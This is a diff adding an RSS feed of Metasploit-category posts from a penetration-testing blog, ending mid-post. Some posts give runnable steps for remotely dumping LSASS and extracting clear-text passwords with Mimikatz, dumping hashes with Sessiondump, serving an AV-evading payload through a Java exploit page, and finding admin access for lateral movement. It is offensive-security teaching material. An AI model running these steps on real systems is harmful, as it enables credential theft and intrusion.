@@ -1,0 +1,667 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Metasploit on Room362</title>
+    <link>http://room362.com/categories/metasploit/</link>
+    <description>Recent content in Metasploit on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Mon, 13 Jan 2014 14:32:04 -0500</lastBuildDate>
+    <atom:link href="http://room362.com/categories/metasploit/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Installing Metasploit Community Edition on Windows 8</title>
+      <link>http://room362.com/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/</link>
+      <pubDate>Mon, 13 Jan 2014 14:32:04 -0500</pubDate>
+      
+      <guid>http://room362.com/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/</guid>
+      <description>&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/a3nzWgUgQO8&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Show URL: &lt;a href=&#34;http://hak5.org/category/episodes/metasploit-minute&#34;&gt;Hak5&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Youtube URL: &lt;a href=&#34;http://www.youtube.com/playlist?list=PLW5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;YouTube&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Show RSS feed: &lt;a href=&#34;http://gdata.youtube.com/feeds/api/playlists/W5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;RSS&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Minute - Mondays with Mubix - Episode 1</title>
+      <link>http://room362.com/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/</link>
+      <pubDate>Mon, 06 Jan 2014 14:30:08 -0500</pubDate>
+      
+      <guid>http://room362.com/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/</guid>
+      <description>&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Show URL: &lt;a href=&#34;http://hak5.org/category/episodes/metasploit-minute&#34;&gt;Hak5&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Youtube URL: &lt;a href=&#34;http://www.youtube.com/playlist?list=PLW5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;YouTube&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Show RSS feed: &lt;a href=&#34;http://gdata.youtube.com/feeds/api/playlists/W5y1tjAOzI3n4KRN_ic8N8Qv_ss_dh_F&#34;&gt;RSS&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/TCPyoWHy4eA&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</title>
+      <link>http://room362.com/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</link>
+      <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</guid>
+      <description>&lt;p&gt;Mimikatz is now &lt;a href=&#34;https://github.com/rapid7/meterpreter/pull/9&#34;&gt;built into Metasploit&amp;rsquo;s meterpreter&lt;/a&gt;, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.&lt;/p&gt;
+
+&lt;p&gt;Mimikatz Minidump: &lt;a href=&#34;http://blog.gentilkiwi.com/securite/mimikatz/minidump&#34;&gt;http://blog.gentilkiwi.com/securite/mimikatz/minidump&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Procdump: &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets start. First we make sure our authentication works against the box and we can look inside of C$ (usually only admins can)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;net use \\TARGETBOXC$ /user:DOMAIN\serviceaccount serviceaccount123
+dir \\TARGETBOX\C$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If that works then we want to check that we can all the &amp;ldquo;AT&amp;rdquo; command on the remote host:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;at \\TARGETBOX
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All set. Next lets prep our workspace on the remote host. We are using the C:\Temp directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mkdir \\TARGETBOX\C$\Temp
+dir \\TARGETBOX\C$\Temp
+copy c:\temp\procdump.exe \\TARGETBOXC$
+copy c:\temp\procdump.bat \\TARGETBOXC$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The contents of procdump.bat are:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;@echo off
+C:\temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;m using the computer name in the memory dump name to help me keep track of where the dump came from, but also help me notice when I&amp;rsquo;ve dumped more than one IP that is actually the same host.&lt;/p&gt;
+
+&lt;p&gt;Next we schedule the task. Use net time to determine the local time for the remote machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;net time \\TARGETBOX
+at \\TARGETBOX 13:52 C:\Temp\procdump.bat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Pull down the file and clean up:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;dir \\TARGETBOX\C$\Temp
+copy \\TARGETBOX\C$\Temp\*lsass.dmp C:\temp\output\
+rmdir /s \\TARGETBOX\C$\Temp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On your side the only thing you need to make sure is that you are running Mimikatz on a similar version and architecture you pulled from. Use the following url for reference:&lt;a href=&#34;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&#34;&gt;http://blog.gentilkiwi.com/wp-content/uploads/2013/04/minidump_matrix.png&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Load up the Alpha version of Mimikatz, switch it to minidump mode and you&amp;rsquo;re dumping creds:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp
+Switch to MINIDUMP
+
+mimikatz # sekurlsa::logonPasswords full
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. Password dumping without ever using a &amp;ldquo;Hacker&amp;rdquo; tool on target. Much love Microsoft. And even more to Mimikatz creator &lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; - Benjamin Delpy for both this alpha release and changing his licensing to allow Mimikatz code to be integrated into Meterpreter.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Sessiondump Meterpreter Extension</title>
+      <link>http://room362.com/post/2013/2013-04-08-sessiondump-meterpreter-extension/</link>
+      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2013/2013-04-08-sessiondump-meterpreter-extension/</guid>
+      <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;http://room362.com/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;
+
+&lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;
+
+&lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NT\AUTHORITY SYSTEM.  After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is the available commands:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And run getHashes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;or getwDigestPasswords:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Possible issues you may run into:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201304_sessiondump_11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Mastery @BlackHatEvents USA 2013</title>
+      <link>http://room362.com/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/</link>
+      <pubDate>Tue, 19 Mar 2013 14:38:36 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/</guid>
+      <description>&lt;p&gt;Just a quick post to say that &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt; and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us&lt;/p&gt;
+
+&lt;p&gt;Linky: &lt;a href=&#34;http://www.blackhat.com/us-13/training/metasploit-mastery.html&#34;&gt;http://www.blackhat.com/us-13/training/metasploit-mastery.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Current fill rate of July 27-28 session: &lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2728MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Current fill rate of July 29-30 session: &lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2930MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;EOM&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Mastery meets CanSecWest</title>
+      <link>http://room362.com/post/2013/2013-01-25-metasploit-mastery-meets-cansecwest/</link>
+      <pubDate>Fri, 25 Jan 2013 16:12:20 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2013/2013-01-25-metasploit-mastery-meets-cansecwest/</guid>
+      <description>&lt;p&gt;In 2012 @&lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt; and I taught &lt;a href=&#34;https://www.derbycon.com/traning-classes-2012/#metasploit&#34;&gt;Metasploit Mastery&lt;/a&gt; for a day and a half @&lt;a href=&#34;https://twitter.com/derbycon&#34;&gt;DerbyCon&lt;/a&gt; . This was a lot of fun but we had to cram a TON of slides into that short period of time. PLUS we had a CTF at the end where people had to break into a corporate network (virtualized) and sell their shells, data, passwords, or flags to us (egypt and I were acting as opposing countries). You could sell low to one and high to another whatever. Most money at the end wins. (We used a score card with ranges to keep it even)&lt;/p&gt;
+
+&lt;p&gt;We are doubling down on the content being provided and doing a 3 full days @&lt;a href=&#34;https://twitter.com/secwest&#34;&gt;CanSecWest&lt;/a&gt;. You get to learn the nooks and cranies of Metasploit&amp;rsquo;s guts from &lt;em&gt;the&lt;/em&gt; egypt himself, and operational use from me, with a ton mixed in between. I mean, just getting in the room with egypt&amp;rsquo;s beard is worth the price of admission.&lt;/p&gt;
+
+&lt;p&gt;See you there!&lt;/p&gt;
+
+&lt;p&gt;Link: &lt;a href=&#34;http://cansecwest.com/dojos/2013/meta_mastery.html&#34;&gt;http://cansecwest.com/dojos/2013/meta_mastery.html&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>EXE::Custom in Metasploit&#39;s Java Exploits</title>
+      <link>http://room362.com/post/2012/2012-11-19-execustom-in-metasploits-java-exploits/</link>
+      <pubDate>Mon, 19 Nov 2012 05:59:10 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-11-19-execustom-in-metasploits-java-exploits/</guid>
+      <description>&lt;p&gt;Let me say first off that this isn&amp;rsquo;t the most elegant of ways to accomplish it. It is in the &amp;ldquo;it works for me&amp;rdquo; stage.&lt;/p&gt;
+
+&lt;p&gt;A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost. If you don&amp;rsquo;t have a handler set up to catch whatever is in your EXE and you have bogus information in your payload settings for your module, Metasploit won&amp;rsquo;t be able to magically determine what you want it to do. So make sure that you either have the payload settings correct (even though it won&amp;rsquo;t use them for the exploit) or set the option &amp;ldquo;DisablePayloadHandler&amp;rdquo; to true and start your own handler somewhere else.&lt;/p&gt;
+
+&lt;p&gt;With that said, the Java Signed Applet attack is one of the most widely used, one problem in the Metasploit module version is that you have no external control (such as EXE::Custom) for the binary that is dropped if you are using a Windows native payload. (I do highly recommend trying out Java Meterpreter, but that it for another post)&lt;/p&gt;
+
+&lt;p&gt;Here is the hack that gets me by until a more elegant solution is thought up by smarter people than I:&lt;/p&gt;
+
+&lt;p&gt;We are going to use the Java Rhino exploit, and this story starts with an undetectable.exe sitting in /tmp/ - How you bypass the AV you are up against is up to you. The first thing we need to do is make a core library change. Yes, this is as scary as it sounds and you should document any time you do so you can revert as needed.&lt;/p&gt;
+
+&lt;p&gt;In your MSF directory open up lib/msf/util/exe.rb - should look something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Scroll down or search for &lt;code&gt;self.to_jar&lt;/code&gt; - should look something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now add &lt;code&gt;exe = File.read(&#39;/path/to/your/evil.exe&#39;)&lt;/code&gt; as demonstrated below:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool. We&amp;rsquo;ve made our change, now we have to pull down a jar generated with our evil bin, and the Rhino exploit. We can do that by spinning up Metasploit with our newly editing core library. Load up the Rhino exploit via &lt;code&gt;use exploit/multi/browser/java_rhino&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One trip up that I messed up even just creating this blog post (and a constant headache in the #Metasploit channel on Freenode) is forgetting to set the TARGET variable in Java exploits. The default payload type being Java. Since we are using a native windows binary we need to specify Windows by setting TARGET 1.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Run the exploit with any settings, since we&amp;rsquo;ll be just pulling out what we need. Then pull down the exploit JAR file with wget:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(Most java exploits are set to answer ANY .jar extension request with the payload.)&lt;/p&gt;
+
+&lt;p&gt;The HTML to load the JAR is pretty straight forward, but if you&amp;rsquo;ve never seen it before here it is:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thats it. A very blank page with an exploit in it. We can do better than that:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Obviously you can do whatever you want with the HTML, mirror a site or what have you. Notice that I&amp;rsquo;ve also changed the name of the JAR. (You can&amp;rsquo;t change the class unless you start making changes to the exploit directly and I wanted to keep this as generically applicable as possible)&lt;/p&gt;
+
+&lt;p&gt;Move the Applet.jar to SuperMario.jar and start up a Web server (for demo using Python&amp;rsquo;s awesome SimpleHTTPServer, but apache will serve as well)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Don&amp;rsquo;t forget to start up a handler for our now-external exploit:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_10.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Victim views the site:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_11.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And WA-LA! we haz shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201211_customejavaexe_12.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yay… Game over..&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Finding Admin Access</title>
+      <link>http://room362.com/post/2012/2012-10-31-finding-admin-access/</link>
+      <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-10-31-finding-admin-access/</guid>
+      <description>&lt;p&gt;You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.&lt;/p&gt;
+
+&lt;p&gt;(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)&lt;/p&gt;
+
+&lt;p&gt;Enter the auxiliary module: &lt;code&gt;auxiliary/admin/smb/check_dir_file&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;First we set up a route as aux modules don&amp;rsquo;t have a &amp;ldquo;SESSION&amp;rdquo; parameter:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_adminaccess_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Use the module and set our credentials:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_adminaccess_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, set ADMIN$ as we can&amp;rsquo;t guarantee C$ is the primary drive, but ADMIN$ will definitely be the WINDOWS directory. Our RHOSTS is our target range&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_adminaccess_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A simple &amp;lsquo;run&amp;rsquo; and away it goes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_adminaccess_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we can see that our lowly user that doesn&amp;rsquo;t have any chance of bypassing the UAC on his current system can pivot to these other systems (172.16.10.10, and 172.16.10.150) quite easily.&lt;/p&gt;
+
+&lt;p&gt;=============================================================================&lt;/p&gt;
+
+&lt;p&gt;The rest of this has nothing to do about admin access, just some tricks to do it better&lt;/p&gt;
+
+&lt;p&gt;=============================================================================&lt;/p&gt;
+
+&lt;p&gt;As many of you know I&amp;rsquo;m not a huge fan of sending packets I don&amp;rsquo;t need to so instead of just spraying a range (which I doubt would be seen, but why take the chance?)&lt;/p&gt;
+
+&lt;p&gt;[&lt;strong&gt;Update&lt;/strong&gt;: While computer_browser_discovery does lookup all the hosts and sends -more- packets than check_dir_file would, those extra packets are sent at DNS resolvers not into empty space that can be detected by network sensors]&lt;/p&gt;
+
+&lt;p&gt;Enter computer_browser_discovery:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_adminaccess_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This module does the equivalent of &amp;lsquo;net view&amp;rsquo; to get a list of computers on the domain. You can change the LTYPE to &amp;ldquo;SQL&amp;rdquo; to just get MSSQL boxes but we&amp;rsquo;re going for everything:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_adminaccess_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see WIN7X86 (the box we are on came up with 0.0.0.0) expected. and the .150 address didn&amp;rsquo;t show up at all as it&amp;rsquo;s not on the domain. So the benefits is that it&amp;rsquo;s quieter on the wire and you probably will find hosts that aren&amp;rsquo;t in your immediate IP range. (Not the case here simply because I don&amp;rsquo;t have a big enough test network). The disadvantages are as with the .150 address you may miss hosts.&lt;/p&gt;
+
+&lt;p&gt;Next we add the found host&amp;rsquo;s IP addresses to a text file (targethosts.txt)&lt;/p&gt;
+
+&lt;p&gt;[because at the time of this writing the computer_browser_discovery module doesn&amp;rsquo;t add the hosts to the MSF database]&lt;/p&gt;
+
+&lt;p&gt;Then use the smb_version module which does a couple things, it verifies that the hosts are there and alive, adds them to the MSF database, and what version of Windows (or samba) they are running:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_adminaccess_7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(We still have our route set up so this is module is going through our low privilege user still)&lt;/p&gt;
+
+&lt;p&gt;And now we have info in the DB for better targeting:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_adminaccess_8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then back in our check_dir_file module we just use the hosts -R to have the database automatically set RHOSTS to the hosts in the database that match your search or alternatively use services -p 445 -R to add all the hosts that you&amp;rsquo;ve found port 445 open (everything smb_version finds will be shown in services)&lt;/p&gt;
+
+&lt;p&gt;One more way you can get hosts is doing reverse lookups of ranges. You can just hit a range you know of, or guess ranges based on the computer_browser_discovery results. You can do this with resolve_ip module (this can be pretty slow on ranges that don&amp;rsquo;t have many hosts):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_adminaccess_9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used the range this blog is hosted on 1) because for some reason my stupid VM wasn&amp;rsquo;t resolving internal stuff 2) To demonstrate that you can use the module to resolve anything, not just internal ranges.&lt;/p&gt;
+
+&lt;p&gt;So to wrap up, we have a ton of ways to find hosts that don&amp;rsquo;t involve traditional scanning (smb_version is the only thing that comes close). And we&amp;rsquo;ve located two hosts that we have the ability to administer. One oddly enough being the domain controller, so don&amp;rsquo;t ever discount the access you already have. Tunnel vision is the pentesters worst enemy.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>BypassUAC got a facelift</title>
+      <link>http://room362.com/post/2012/2012-10-30-bypassuac-got-a-facelift/</link>
+      <pubDate>Tue, 30 Oct 2012 20:05:21 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-10-30-bypassuac-got-a-facelift/</guid>
+      <description>&lt;p&gt;Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;Old&amp;rdquo; module &lt;code&gt;post/windows/escalate/bypassuac&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_bypassuac_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I decided to give it a bit of a face lift:&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;New&amp;rdquo; local exploit module &lt;code&gt;exploit/windows/local/bypassuac&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201210_bypassuac_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All of the credit for the availability of this module goes to &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.&lt;/p&gt;
+
+&lt;p&gt;Anywho, on to the new features:&lt;/p&gt;
+
+&lt;p&gt;1) You can set any windows payload you want to use now:&lt;/p&gt;
+
